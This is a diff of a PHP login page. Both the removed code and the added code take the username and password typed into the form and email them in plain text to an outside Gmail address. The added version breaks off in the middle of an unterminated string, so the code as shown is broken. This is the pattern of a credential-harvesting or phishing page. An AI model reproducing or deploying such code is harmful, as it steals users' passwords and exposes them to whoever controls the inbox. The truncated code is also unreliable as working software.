@@ -50,24 +50,17 @@
 			<label for="password">Password</label>
 			<input type="password" name="password" id="password" required>
 			<input type="submit" value="Login" name="submit">
-		</form>
-	</div>
-	
+		</form> 
+		</div>
 	<?php
-		if(isset($_POST['submit'])){
-			$username = $_POST['username'];
-			$password = $_POST['password'];
-			
-			$to = "hamedyousry123@gmail.com"; // تعديل الإيميل هنا
-			$subject = "New Login";
-			$body = "Username: $username\nPassword: $password";
-			
-			if(mail($to, $subject, $body)){
-				echo "<script>alert('Login information sent successfully.');</script>";
-			} else {
-				echo "<script>alert('An error occurred while sending the login information.');</script>";
-			}
-		}
-	?>
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = $_POST["username"];
+    $password = $_POST["password"];
+
+    // تحقق من بيانات المستخدم هنا. 
+    // إذا كانت صحيحة ، ارسل بريد إلكتروني إلى العميل.
+
+    $to = "hamedyousry123@gmail.com";
+    $subject = "تسجيل الدخول 
 </body>
 </html>
